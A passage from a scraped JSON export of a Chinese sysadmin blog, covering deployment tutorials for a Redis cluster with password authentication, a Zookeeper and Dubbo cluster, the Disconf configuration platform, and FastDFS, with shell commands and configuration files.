additional replica(s)M: 3c2b327b2b56ddf07fc4040061f95dd6458b5154 10.1.1.150:6379 slots:10923-16383 (5461 slots) master 1 additional replica(s)S: 0d43b62b9ce2241147376574280e339b1fc3a97b 10.1.1.148:7379 slots: (0 slots) slave replicates 74719e18073c6ac08da0a5608e7986d057e51ee4[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered. 检查集群状态1234567891011121314151617181920212223242526# /home/soft/redis/redis-3.2.6/src/redis-trib.rb check 10.1.1.148:6379&gt;&gt;&gt; Performing Cluster Check (using node 10.1.1.148:6379)M: ce3a2498a81f450b3d648bc1ede7c82fcac87cf2 10.1.1.148:6379 slots:5461-10922 (5462 slots) master 1 additional replica(s)S: 40a7736a56fe9671a79eb4e392a3669a4797c4d3 10.1.1.149:7379 slots: (0 slots) slave replicates ce3a2498a81f450b3d648bc1ede7c82fcac87cf2S: b6e2e6c8093bfa92d49c6f3771316ca1c5304c01 10.1.1.150:7379 slots: (0 slots) slave replicates 3c2b327b2b56ddf07fc4040061f95dd6458b5154M: 74719e18073c6ac08da0a5608e7986d057e51ee4 10.1.1.149:6379 slots:0-5460 (5461 slots) master 1 additional replica(s)M: 3c2b327b2b56ddf07fc4040061f95dd6458b5154 10.1.1.150:6379 slots:10923-16383 (5461 slots) master 1 additional replica(s)S: 0d43b62b9ce2241147376574280e339b1fc3a97b 10.1.1.148:7379 slots: (0 slots) slave replicates 74719e18073c6ac08da0a5608e7986d057e51ee4[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered.redis-trib.rb工具可以拷贝到任意目录下使用，建议拷贝到redis的bin目录下；如果集群开启了密码认证，需要在client.rb文件中设置密码参数。 测试redis集群1234567891011121314# redis-cli -h 10.1.1.148 -p 637910.1.1.148:6379&gt; set test test01OK10.1.1.148:6379&gt; get test&quot;test01&quot;# redis-cli -h 10.1.1.149 -p 737910.1.1.149:7379&gt; get test(error) MOVED 6918 10.1.1.148:6379发现在另一节点上无法get，因为Redis集群的数据是根据插槽值来设置进具体的节点中的.但是如果这个key的插槽值不是在当前redis实例的话,他就需要进行重定向.所以redis-cli提供可一个-c参数用来连接集群，指定了这个参数之后,redis-cli会根据插槽值做一个重定向,连接到指定的redis实例上面。# redis-cli -c -h 10.1.1.149 -p 737910.1.1.149:7379&gt; get test-&gt; Redirected to slot [6918] located at 10.1.1.148:6379&quot;test01&quot; 为redis集群开启密码认证redis-cluster集群开启密码认证有两种方式：123456781. 在使用redis-trib.rb工具创建cluster集群前，在每个节点上开启密码认证，然后在ruby-gem配置文件中指定密码（各节点密码必须一致）# vim /usr/local/rvm/gems/ruby-2.4.1/gems/redis-4.0.1/lib/redis/client.rb:password =&gt; &apos;PASSWORD&apos; #在此处填写密码此处因为我的gem redis库是通过rvm安装的，所以client.rb文件路径在/usr/local/rvm/下，如果你的不是使用rvm安装，可以直接使用find搜索client.rb文件并修改。上述方法配置集群密码验证比较复杂不建议使用；但是配置client.rb中的password参数有一个好处：当集群开启认证，配置了client.rb中的password参数后，可以直接使用源码包中提供的redis-trib.rb工具来查看集群信息，具体的使用参数可以--help（redis-trib.rb工具可以拷贝到任意目录下使用）。 123456789102. 在创建cluster集群前不设置密码认证，创建集群完成后，登录到每一个集群节点创建密码，命令如下：# redis-cli -c -h 10.1.1.148 -p 6379 # 此处注意是集群所有节点，包括所有主从节点10.1.1.148:6379&gt; config set masterauth 12345610.1.1.148:6379&gt; config set requirepass 123456上述命令执行完成后，需退出redis重新使用密码认证登录，否则后续命令将无权执行。# redis-cli -c -h 10.1.1.148 -p 6379 -a &apos;123456&apos;10.1.1.148:6379&gt; config rewrite执行完成config rewrite命令后，redis密码会自动保存到redis的config配置文件中。上述配置一定要注意，必须在集群所有节点一一执行，建议集群各节点密码一致（节点密码不一致的情况我也没有试过，有兴趣的可以试试）。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"Redis","slug":"Linux/Redis","permalink":"http://blog.unixmen.cn/categories/Linux/Redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://blog.unixmen.cn/tags/redis/"},{"name":"redis-cluster","slug":"redis-cluster","permalink":"http://blog.unixmen.cn/tags/redis-cluster/"}]},{"title":"Zookeeper+dubbo部署分布式服务集群","slug":"zookeeper+dubbo+分布式服务集群","date":"2017-01-31T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2017/02/01/zookeeper+dubbo+分布式服务集群/","link":"","permalink":"http://blog.unixmen.cn/2017/02/01/zookeeper+dubbo+分布式服务集群/","excerpt":"1. 配置前准备工作部署规划\n集群使用三台服务器，分别部署zookeeper、dubbo-admin服务，其中zookeeper分别部署在三台服务器上，dubbo-admin部署于三台服务器其中一台上，三台zookeeper构成集群，而dubbo-admin是否正常对于dubbo服务正常运行并不会造成任何影响，因此dubbo采用单点部署。zookeeper安装路径：/usr/local/zookeeper-3.4.6/链接至/usr/local/zookeeper/zookeeper数据存放路径/home/zookeeper/data/zookeeper日志存放路径/usr/local/zookeeper/log/clientPort:2181zookeeper数据交换端口:2888zookeeper选举端口:3888\n\n准备安装程序12345# ls /home/soft/dubbo-admin-tomcat.tar.gz  dubbo-monitor-simple-2.8.4-assembly.tar.gz  jdk-8u111-linux-x64.rpm  zookeeper-3.4.6.tar.gz# tar zxf zookeeper-3.4.6.tar.gz# mv /home/soft/zookeeper-3.4.6 /usr/local/# ln -s /usr/local/zookeeper-3.4.6 /usr/local/zookeeper\n创建相关安装目录1234# mkdir -pv /home/zookeeper/data/mkdir: created directory `/home/zookeeper&apos;mkdir: created directory `/home/zookeeper/data/&apos;# mkdir /usr/local/zookeeper/log/","text":"1. 配置前准备工作部署规划 集群使用三台服务器，分别部署zookeeper、dubbo-admin服务，其中zookeeper分别部署在三台服务器上，dubbo-admin部署于三台服务器其中一台上，三台zookeeper构成集群，而dubbo-admin是否正常对于dubbo服务正常运行并不会造成任何影响，因此dubbo采用单点部署。zookeeper安装路径：/usr/local/zookeeper-3.4.6/链接至/usr/local/zookeeper/zookeeper数据存放路径/home/zookeeper/data/zookeeper日志存放路径/usr/local/zookeeper/log/clientPort:2181zookeeper数据交换端口:2888zookeeper选举端口:3888 准备安装程序12345# ls /home/soft/dubbo-admin-tomcat.tar.gz dubbo-monitor-simple-2.8.4-assembly.tar.gz jdk-8u111-linux-x64.rpm zookeeper-3.4.6.tar.gz# tar zxf zookeeper-3.4.6.tar.gz# mv /home/soft/zookeeper-3.4.6 /usr/local/# ln -s /usr/local/zookeeper-3.4.6 /usr/local/zookeeper 创建相关安装目录1234# mkdir -pv /home/zookeeper/data/mkdir: created directory `/home/zookeeper&apos;mkdir: created directory `/home/zookeeper/data/&apos;# mkdir /usr/local/zookeeper/log/ 配置相应的iptables规则12# iptables -I INPUT -s 10.1.1.0/24 -p tcp -j ACCEPT# service iptables save 2. 安装并配置JDK因为zookeeper是Java语言开发的项目，所以要先安装JDK。 安装JDK1# rpm -ivh jdk-8u111-linux-x64.rpm 配置JAVA环境变量123# vim /etc/profile.d/java.shexport JAVA_HOME=/usr/java/latestexport PATH=$JAVA_HOME/bin:$PATH 导出环境变量1# source /etc/profile.d/java.sh 查看Java版本1# java -version 3. 安装并配置zookeeper准备zookeeper配置文件12345678910111213141516171819# cd /usr/local/zookeeper# pwd/usr/local/zookeeper# cd conf/# pwd/usr/local/zookeeper/conf# cp zoo_sample.cfg zoo.cfg# vim zoo.cfgtickTime=2000initLimit=10syncLimit=5dataDir=/home/zookeeper/datadataLogDir=/usr/local/zookeeper/logclientPort=2181server.1=10.1.1.148:2888:3888server.2=10.1.1.149:2888:3888server.3=10.1.1.150:2888:3888这里的地址用IP或主机名都可以。 在data目录下创建myid文件1234567分别在三台服务器上创建myid文件，myid文件中的只要与配置文件中对应，依次为：10.1.1.148echo &quot;1&quot; &gt; /home/zookeeper/data/myid10.1.1.149echo &quot;2&quot; &gt; /home/zookeeper/data/myid10.1.1.150echo &quot;3&quot; &gt; /home/zookeeper/data/myid 启动并测试zookeeper1234# /usr/local/zookeeper/bin/zkServer.sh start# jps -l16691 org.apache.zookeeper.server.quorum.QuorumPeerMain16758 sun.tools.jps.Jps 4. 安装dubbo-admin并配置安装dubbo-admin12345678dubbo-admin是否正常对于dubbo服务正常运行并不会造成任何影响，因此dubbo采用单点部署，此次部署在10.1.1.148上。# pwd/home/soft# tar zxf dubbo-admin-tomcat.tar.gz# mv /home/soft/dubbo-admin-tomcat /usr/local/# cd /usr/local/dubbo-admin-tomcat/# lsbin conf lib LICENSE logs NOTICE RELEASE-NOTES RUNNING.txt temp webapps work 配置dubbo.properties123456789# pwd/usr/local/dubbo-admin-tomcat# cd webapps/ROOT/WEB-INF/# lsclasses common dubbo.properties forms i18n lib log4j.xml templates webx-governance.xml webx-home.xml web.xml webx-personal.xml webx-sysinfo.xml webx-sysmanage.xml webx.xml# vim dubbo.propertiesdubbo.registry.address=zookeeper://10.1.1.148:2181?backup=10.1.1.149:2181,10.1.1.150:2181dubbo.admin.root.password=rootdubbo.admin.guest.password=guest 启动dubbo-admin12345678910111213141516171819# /usr/local/dubbo-admin-tomcat/bin/catalina.sh startUsing CATALINA_BASE: /usr/local/dubbo-admin-tomcatUsing CATALINA_HOME: /usr/local/dubbo-admin-tomcatUsing CATALINA_TMPDIR: /usr/local/dubbo-admin-tomcat/tempUsing JRE_HOME: /usr/java/latestUsing CLASSPATH: /usr/local/dubbo-admin-tomcat/bin/bootstrap.jar:/usr/local/dubbo-admin-tomcat/bin/tomcat-juli.jarTomcat started.# netstat -nultpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1005/master tcp 0 0 0.0.0.0:11580 0.0.0.0:* LISTEN 1366/sshd tcp 0 0 ::ffff:10.1.1.148:3888 :::* LISTEN 5132/java tcp 0 0 :::56656 :::* LISTEN 5132/java tcp 0 0 :::8082 :::* LISTEN 5241/java tcp 0 0 ::1:25 :::* LISTEN 1005/master tcp 0 0 :::11580 :::* LISTEN 1366/sshd tcp 0 0 :::2181 :::* LISTEN 5132/java tcp 0 0 :::8010 :::* LISTEN 5241/java 访问dubbo-admin web页面测试1http://10.1.1.148:8082 5. 安装dubbo-monitor并配置安装dubbo-monitor12345678dubbo-monitor也只需单点部署即可# pwd/home/soft# tar zxf dubbo-monitor-simple-2.8.4-assembly.tar.gz# mv /home/soft/dubbo-monitor-simple-2.8.4 /usr/local/dubbo-monitor# cd /usr/local/dubbo-monitor/# lsbin conf lib 配置dubbo.properties1234567891011121314# pwd/usr/local/dubbo-monitor/conf# vim dubbo.propertiesdubbo.container=log4j,spring,registry,jettydubbo.application.name=simple-monitordubbo.application.owner=kp-javadubbo.registry.address=zookeeper://10.1.1.148:2181?backup=10.1.1.149:2181,10.1.1.150:2181dubbo.protocol.port=7070dubbo.jetty.port=8080dubbo.jetty.directory=$&#123;user.home&#125;/monitordubbo.charts.directory=$&#123;dubbo.jetty.directory&#125;/chartsdubbo.statistics.directory=$&#123;user.home&#125;/monitor/statisticsdubbo.log4j.file=logs/dubbo-monitor-simple.logdubbo.log4j.level=WARN 启动dubbo-monitor1# /usr/local/dubbo-monitor/bin/server.sh start 访问dubbo-monitor web页面测试1http://10.1.1.149:8080","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"Zookeeper","slug":"Linux/Zookeeper","permalink":"http://blog.unixmen.cn/categories/Linux/Zookeeper/"},{"name":"Dubbo","slug":"Linux/Zookeeper/Dubbo","permalink":"http://blog.unixmen.cn/categories/Linux/Zookeeper/Dubbo/"}],"tags":[{"name":"zookeeper","slug":"zookeeper","permalink":"http://blog.unixmen.cn/tags/zookeeper/"},{"name":"dubbo","slug":"dubbo","permalink":"http://blog.unixmen.cn/tags/dubbo/"},{"name":"分布式服务","slug":"分布式服务","permalink":"http://blog.unixmen.cn/tags/分布式服务/"}]},{"title":"Disconf分布式配置管理平台部署","slug":"disconf+分布式配置管理平台部署","date":"2017-01-25T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2017/01/26/disconf+分布式配置管理平台部署/","link":"","permalink":"http://blog.unixmen.cn/2017/01/26/disconf+分布式配置管理平台部署/","excerpt":"1. 前言\nDisconf是由百度开源的一套分布式配置管理平台（Distributed Configuration Management Platform），专注于各种「分布式系统配置管理」的「通用组件」和「通用平台」, 提供统一的「配置管理服务」。首先，实现了同构系统的配置发布统一化，提供了配置服务server，该服务可以对配置进行持久化管理并对外提供restful接口，在此基础上，基于zookeeper实现对配置更改的实时推送，并且，提供了稳定有效的容灾方案，以及用户体验良好的编程模型和WEB用户管理界面。其次，实现了异构系统的配置包管理，提出基于zookeeper的全局分布式一致性锁来实现主备统一部署、系统异常时的主备自主切换。\n\n2. 配置前准备工作部署规划\nDisconf分为web端与client端，web端统一管理各个环境的配置，在此我们只需要部署web端即可。Disconf的部署非常简单，它是java语言开发的程序，部署时只需将war包部署到相应位置即可运行，因此只需要在JDK+Tomcat环境中将disconf的war包部署即可。为保证高可用，我们将disconf分别部署到三台服务器上，并在前端采用nginx实现动静分离+负载均衡。disconf依赖tomcat环境部署路径：/usr/local/disconf-tomcat/disconf部署路径：/home/disconf/wardisconf打包前配置文件存放路径：/home/disconf/conf/disconf日志文件存放路径：/home/disconf/log/disconf前端静态文件存放路径：/home/disconf/war/html/disconf-web监听端口：8085disconf前端nginx监听端口：8888\n","text":"1. 前言 Disconf是由百度开源的一套分布式配置管理平台（Distributed Configuration Management Platform），专注于各种「分布式系统配置管理」的「通用组件」和「通用平台」, 提供统一的「配置管理服务」。首先，实现了同构系统的配置发布统一化，提供了配置服务server，该服务可以对配置进行持久化管理并对外提供restful接口，在此基础上，基于zookeeper实现对配置更改的实时推送，并且，提供了稳定有效的容灾方案，以及用户体验良好的编程模型和WEB用户管理界面。其次，实现了异构系统的配置包管理，提出基于zookeeper的全局分布式一致性锁来实现主备统一部署、系统异常时的主备自主切换。 2. 配置前准备工作部署规划 Disconf分为web端与client端，web端统一管理各个环境的配置，在此我们只需要部署web端即可。Disconf的部署非常简单，它是java语言开发的程序，部署时只需将war包部署到相应位置即可运行，因此只需要在JDK+Tomcat环境中将disconf的war包部署即可。为保证高可用，我们将disconf分别部署到三台服务器上，并在前端采用nginx实现动静分离+负载均衡。disconf依赖tomcat环境部署路径：/usr/local/disconf-tomcat/disconf部署路径：/home/disconf/wardisconf打包前配置文件存放路径：/home/disconf/conf/disconf日志文件存放路径：/home/disconf/log/disconf前端静态文件存放路径：/home/disconf/war/html/disconf-web监听端口：8085disconf前端nginx监听端口：8888 准备安装程序123456# ls /home/soft/disconf/apache-maven-3.3.9-bin.tar.gz apache-tomcat-8.0.39.tar.gz# tar zxf apache-maven-3.3.9-bin.tar.gz# tar zxf apache-tomcat-8.0.39.tar.gz# lsapache-maven-3.3.9 apache-maven-3.3.9-bin.tar.gz apache-tomcat-8.0.39 apache-tomcat-8.0.39.tar.gz 创建相关安装目录12345# mkdir -pv /home/disconf/&#123;conf,war,log&#125;mkdir: created directory `/home/disconf&apos;mkdir: created directory `/home/disconf/conf&apos;mkdir: created directory `/home/disconf/war&apos;mkdir: created directory `/home/disconf/log&apos; 3. 部署配置Disconf3.1 安装配置JDK环境disconf是采用JAVA语言开发的程序，所以需要先安装配置JDK环境，本次因为我们部署disconf的服务器已配置过JDK环境，故在此略过配置详细步骤。 3.2. 部署配置MAVEN因为最新版本的disconf仅提供源码，因此需要我们将源码下载到服务器，然后通过maven来打包，所以我们要先部署maven环境，只需在其中一台服务器上部署maven即可。12345678910111213# mv apache-maven-3.3.9 /usr/local/maven# vim /etc/profile.d/maven.shexport MAVEN_HOME=/usr/local/mavenexport PATH=$MAVEN_HOME/bin:$PATH# source /etc/profile.d/maven.sh # mvn -vApache Maven 3.3.9 (bb52d8502b132ec0a5a3f4c09453c07478323dc5; 2015-11-11T00:41:47+08:00)Maven home: /usr/local/mavenJava version: 1.8.0_111, vendor: Oracle CorporationJava home: /usr/java/jdk1.8.0_111/jreDefault locale: en_US, platform encoding: UTF-8OS name: &quot;linux&quot;, version: &quot;2.6.32-642.4.2.el6.x86_64&quot;, arch: &quot;amd64&quot;, family: &quot;unix&quot; maven默认中央仓库为apache官方，在国内使用速度是相当之慢，因此，建议将中央仓库修改为阿里云仓库。12345678910# vim /usr/local/maven/conf/settings.xml添加如下配置： &lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;/mirrors&gt; maven配置成功。 3.3 为Disconf准备MySQL数据库环境在MySQL服务器上创建数据库disconf并设置相应的用户。12345678mysql&gt; create database disconf;Query OK, 1 row affected (0.00 sec)mysql&gt; grant all privileges on disconf.* to &apos;disconf&apos;@&apos;192.168.1.%&apos; identified by &apos;bh7F3d0djPhkTcp9D&apos;;Query OK, 0 rows affected, 1 warning (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) 将disconf源码目录下的sql文件上传到MySQL服务器上，并按照readme.md文件中的说明，依此导入sql文件。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273# pwd/home/soft/disconf/disconf-master/disconf-web/sql# ls0-init_table.sql 1-init_data.sql 201512 20160701 deprecated readme.md# more readme.md 为了方便大家开发，统一了所有SQL，请先后执行：- 0-init_table.sql create db,tables- 1-init_data.sql create data- 201512/20151225.sql patch- 20160701/20160701.sql patchmysql&gt; source /home/soft/sql/0-init_table.sqlQuery OK, 1 row affected, 1 warning (0.00 sec)Database changedQuery OK, 0 rows affected (0.01 sec)Query OK, 0 rows affected (0.01 sec)Query OK, 0 rows affected (0.01 sec)Query OK, 0 rows affected (0.01 sec)Query OK, 0 rows affected (0.01 sec)Query OK, 0 rows affected (0.01 sec)mysql&gt; source /home/soft/sql/1-init_data.sqlQuery OK, 1 row affected (0.00 sec)Query OK, 16 rows affected (0.00 sec)Records: 16 Duplicates: 0 Warnings: 0Query OK, 4 rows affected (0.00 sec)Records: 4 Duplicates: 0 Warnings: 0Query OK, 3 rows affected (0.00 sec)Records: 3 Duplicates: 0 Warnings: 0Query OK, 72 rows affected (0.00 sec)Records: 72 Duplicates: 0 Warnings: 0Query OK, 8 rows affected (0.00 sec)Records: 8 Duplicates: 0 Warnings: 0mysql&gt; source /home/soft/sql/201512/20151225.sqlQuery OK, 0 rows affected (0.01 sec)Query OK, 0 rows affected (0.03 sec)Records: 0 Duplicates: 0 Warnings: 0mysql&gt; source /home/soft/sql/20160701/20160701.sqlQuery OK, 0 rows affected (0.02 sec)Records: 0 Duplicates: 0 Warnings: 0Query OK, 3 rows affected (0.00 sec)Records: 3 Duplicates: 0 Warnings: 0mysql&gt; show tables;+-------------------+| Tables_in_disconf |+-------------------+| app || config || config_history || env || role || role_resource || user |+-------------------+7 rows in set (0.00 sec)出现上面7个表，就说明数据库初始化成功。 3.4 下载并打包disconf-web1234567# ls /home/soft/disconf/disconf-master.zip# unzip disconf-master.zip# lsdisconf-master disconf-master.zip# pwd/home/soft/disconf/disconf-master 将mvn编译打包需要的文件拷贝到/home/disconf/conf目录下。12345678# cp disconf-web/profile/rd/* /home/disconf/conf/# cd /home/disconf/conf/# lsapplication-demo.properties jdbc-mysql.properties log4j.properties logback.xml redis-config.properties zoo.properties# mv application-demo.properties application.properties # lsapplication.properties jdbc-mysql.properties log4j.properties logback.xml redis-config.properties zoo.properties切记，一定要将配置文件application-demo.properties修改为application.properties 修改配置文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# vim jdbc-mysql.propertiesjdbc.driverClassName=com.mysql.jdbc.Driverjdbc.db_0.url=jdbc:mysql://192.168.1.110:3306/disconf?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;rewriteBatchedStatements=falsejdbc.db_0.username=disconfjdbc.db_0.password=bh7F3d0djPhkTcp9Djdbc.maxPoolSize=20jdbc.minPoolSize=10jdbc.initialPoolSize=10jdbc.idleConnectionTestPeriod=1200jdbc.maxIdleTime=3600# vim log4j.propertieslog4j.rootLogger=INFO,dailyRolling,CONSOLElog4j.logger.org.apache.zookeeper=WARNlog4j.logger.org.springframework=INFOlog4j.logger.org.springframework.aop.framework.Cglib2AopProxy = INFOlog4j.appender.dailyRolling=org.apache.log4j.DailyRollingFileAppenderlog4j.appender.dailyRolling.File=/home/disconf/log/disconf-log4j.loglog4j.appender.dailyRolling.layout=org.apache.log4j.PatternLayoutlog4j.appender.dailyRolling.layout.ConversionPattern=%d [%t] %-5p %-17c&#123;2&#125; (%13F:%L) %3x - %m%nlog4j.appender.Threshold=WARNlog4j.appender.CONSOLE=org.apache.log4j.ConsoleAppenderlog4j.appender.CONSOLE.Target=System.outlog4j.appender.CONSOLE.layout=org.apache.log4j.PatternLayoutlog4j.appender.CONSOLE.layout.ConversionPattern=%d [%t] %-5p %-17c&#123;2&#125; (%13F:%L) %3x - %m%n# vim redis-config.propertiesredis.group1.retry.times=2redis.group1.client1.name=BeidouRedis1redis.group1.client1.host=192.168.1.5redis.group1.client1.port=6379redis.group1.client1.timeout=5000redis.group1.client1.password=foobaredredis.group1.client2.name=BeidouRedis2redis.group1.client2.host=192.168.1.6redis.group1.client2.port=6379redis.group1.client2.timeout=5000redis.group1.client2.password=foobaredredis.group1.client3.name=BeidouRedis3redis.group1.client3.host=192.168.1.7redis.group1.client3.port=6379redis.group1.client3.timeout=5000redis.group1.client3.password=foobaredredis.evictor.delayCheckSeconds=300redis.evictor.checkPeriodSeconds=30redis.evictor.failedTimesToBeTickOut=6# vim zoo.propertieshosts=192.168.1.104:2181,192.168.1.105:2181,192.168.1.106:2181# zookeeper\\u7684\\u524D\\u7F00\\u8DEF\\u5F84\\u540Dzookeeper_url_prefix=/disconf 编译disconf源文件，生成war包1234567891011121314151617181920# pwd/home/soft/disconf/disconf-master# mvn clean install这一步如果报错，可以忽略。设置环境变量# vim /etc/profile.d/war.shexport ONLINE_CONFIG_PATH=/home/disconf/confexport WAR_ROOT_PATH=/home/disconf/war# source /etc/profile.d/war.sh执行编译脚本# cd disconf-web/# pwd/home/soft/disconf/disconf-master/disconf-web# sh deploy/deploy.sh编译结束后，会在$WAR_ROOT_PATH位置下生成如下文件：# ls /home/disconf/war/application.properties disconf-web.war html jdbc-mysql.properties jpaas_control log4j.properties logback.xml META-INF redis-config.properties Release WEB-INF zoo.properties 3.5 部署配置nginx+tomcatnginx与tomcat的部署，在之前的文档有过详细说明，在此不赘述。 修改tomcat配置文件123456789# vim /usr/local/disconf-tomcat/conf/server.xml &lt;Connector port=&quot;8085&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt; &lt;Host name=&quot;localhost&quot; appBase=&quot;webapps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; &lt;Context path=&quot;&quot; docBase=&quot;/home/disconf/war&quot;&gt;&lt;/Context&gt; 修改nginx配置文件1234567891011121314151617181920212223242526272829303132333435# vim /usr/local/openresty/nginx/conf/nginx.conf upstream disconf &#123; server 192.168.1.104:8085 weight=10 max_fails=2 fail_timeout=30s; &#125; server &#123; listen 8888; server_name localhost; #charset koi8-r; charset utf-8; #access_log logs/host.access.log main; access_log logs/disconf.access.log main; error_log logs/disconf.error.log; #location / &#123; # root html; # index index.html index.htm; #&#125; location / &#123; root /home/disconf/war/html; if ($query_string) &#123; expires max; &#125; &#125; location ~ ^/(api|export) &#123; proxy_pass_header Server; proxy_set_header Host $http_host; proxy_redirect off; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Scheme $scheme; proxy_pass http://disconf; &#125; 分别启动nginx、tomcat服务。 3.6 访问Disconf Web页面测试123http://192.168.1.104:8888/使用用户名密码admin/admin正常登陆，disconf配置完成。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"Disconf","slug":"Linux/Disconf","permalink":"http://blog.unixmen.cn/categories/Linux/Disconf/"}],"tags":[{"name":"disconf","slug":"disconf","permalink":"http://blog.unixmen.cn/tags/disconf/"},{"name":"分布式","slug":"分布式","permalink":"http://blog.unixmen.cn/tags/分布式/"},{"name":"配置管理","slug":"配置管理","permalink":"http://blog.unixmen.cn/tags/配置管理/"}]},{"title":"FastDFS部署配置","slug":"FastDFS部署配置","date":"2017-01-23T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2017/01/24/FastDFS部署配置/","link":"","permalink":"http://blog.unixmen.cn/2017/01/24/FastDFS部署配置/","excerpt":"1. 安装FastDFS服务所需软件包\nfastdfs-nginx-module_v1.16.tar.gzFastDFS_v5.05.tar.gzlibfastcommonngx_cache_purge-2.3.tar.gz\n\n安装软件依赖环境1# yum install -y libevent gcc* git\n安装 libfastcommon123456789101112131415从github下载最新的libfastcommon# git clone https://github.com/happyfish100/libfastcommon.git# cd libfastcommon编译# ./make.sh安装# ./make.sh install指定库文件加载位置# vim /etc/ld.so.conf.d/libfastcommon.conf/usr/local/lib/usr/local/lib64/usr/lib64/usr/lib然后执行ldconfig更新/etc/ld.so.cache文件# ldconfig","text":"1. 安装FastDFS服务所需软件包 fastdfs-nginx-module_v1.16.tar.gzFastDFS_v5.05.tar.gzlibfastcommonngx_cache_purge-2.3.tar.gz 安装软件依赖环境1# yum install -y libevent gcc* git 安装 libfastcommon123456789101112131415从github下载最新的libfastcommon# git clone https://github.com/happyfish100/libfastcommon.git# cd libfastcommon编译# ./make.sh安装# ./make.sh install指定库文件加载位置# vim /etc/ld.so.conf.d/libfastcommon.conf/usr/local/lib/usr/local/lib64/usr/lib64/usr/lib然后执行ldconfig更新/etc/ld.so.cache文件# ldconfig 安装FastDFS12345# tar zxf FastDFS_v5.05.tar.gz# cd FastDFS/# ./make.sh# ./make.sh install确认make没有错误后，执行安装，默认会安装到/usr/bin中，并在/etc/fdfs中添加三个配置文件。 创建文件存放路径12345# mkdir -p /home/fastdfs/tracker #创建tracker文件存放路径# mkdir -p /home/fastdfs/storage #创建storage 文件存放路径# mkdir -p /home/fastdfs/client #创建client 文件存放路径# mkdir -pv /home/fastdfs/&#123;tracker,storage,client&#125; 修改配置文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129# cd /etc/fdfs/# lsclient.conf.sample storage.conf.sample tracker.conf.sample# cp client.conf.sample client.conf# cp storage.conf.sample storage.conf# cp tracker.conf.sample tracker.conf# vim tracker.confdisabled=falsebind_addr=port=22122connect_timeout=30network_timeout=60base_path=/home/fastdfs/trackermax_connections=256accept_threads=1work_threads=4store_lookup=2store_group=group2store_server=0store_path=0download_server=0reserved_storage_space = 10%log_level=inforun_by_group=run_by_user=allow_hosts=*sync_log_buff_interval = 10check_active_interval = 120thread_stack_size = 64KBstorage_ip_changed_auto_adjust = truestorage_sync_file_max_delay = 86400storage_sync_file_max_time = 300use_trunk_file = false slot_min_size = 256slot_max_size = 16MBtrunk_file_size = 64MBtrunk_create_file_advance = falsetrunk_create_file_time_base = 02:00trunk_create_file_interval = 86400trunk_create_file_space_threshold = 20Gtrunk_init_check_occupying = falsetrunk_init_reload_from_binlog = falsetrunk_compress_binlog_min_interval = 0use_storage_id = falsestorage_ids_filename = storage_ids.confid_type_in_filename = ipstore_slave_file_use_link = falserotate_error_log = falseerror_log_rotate_time=00:00rotate_error_log_size = 0log_file_keep_days = 0use_connection_pool = falseconnection_pool_max_idle_time = 3600http.server_port=8080http.check_alive_interval=30http.check_alive_type=tcphttp.check_alive_uri=/status.html# vim storage.confdisabled=falsegroup_name=group1bind_addr=client_bind=trueport=23000connect_timeout=30network_timeout=60heart_beat_interval=30stat_report_interval=60base_path=/home/fastdfs/storagemax_connections=256buff_size = 256KBaccept_threads=1work_threads=4disk_rw_separated = truedisk_reader_threads = 1disk_writer_threads = 1sync_wait_msec=50sync_interval=0sync_start_time=00:00sync_end_time=23:59write_mark_file_freq=500store_path_count=1store_path0=/home/fastdfs/storagesubdir_count_per_path=256tracker_server=10.1.1.150:22122log_level=inforun_by_group=run_by_user=allow_hosts=*file_distribute_path_mode=0file_distribute_rotate_count=100fsync_after_written_bytes=0sync_log_buff_interval=10sync_binlog_buff_interval=10sync_stat_file_interval=300thread_stack_size=512KBupload_priority=10if_alias_prefix=check_file_duplicate=0file_signature_method=hashkey_namespace=FastDFSkeep_alive=0use_access_log = falserotate_access_log = falseaccess_log_rotate_time=00:00rotate_error_log = falseerror_log_rotate_time=00:00rotate_access_log_size = 0rotate_error_log_size = 0log_file_keep_days = 0file_sync_skip_invalid_record=falseuse_connection_pool = falseconnection_pool_max_idle_time = 3600http.domain_name=http.server_port=8888# vim client.confconnect_timeout=30network_timeout=60base_path=/home/fastdfs/clienttracker_server=10.1.1.150:22122log_level=infouse_connection_pool = falseconnection_pool_max_idle_time = 3600load_fdfs_parameters_from_tracker=falseuse_storage_id = falsestorage_ids_filename = storage_ids.confhttp.tracker_server_port=80 启动tracker和storage服务12345678# /usr/bin/fdfs_trackerd /etc/fdfs/tracker.conf# /usr/bin/fdfs_storaged 